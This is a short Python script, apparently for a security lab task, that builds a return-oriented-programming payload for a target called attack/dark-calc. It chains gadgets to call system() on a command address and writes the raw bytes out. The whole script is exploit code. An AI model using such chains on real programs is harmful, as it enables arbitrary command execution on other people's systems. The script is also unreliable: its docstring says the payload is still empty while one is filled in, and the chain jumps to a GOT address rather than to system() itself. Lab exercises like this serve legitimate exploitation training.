#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x401C93
RET = 0x401AC2
system_got = 0x603038

cmd_addr = 0x6030D0

payload = (
    b"attack/malware"
    + b"\x00"
    + b"A" * 7
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(cmd_addr)
    + p64(system_got)
)

sys.stdout.buffer.write(payload)
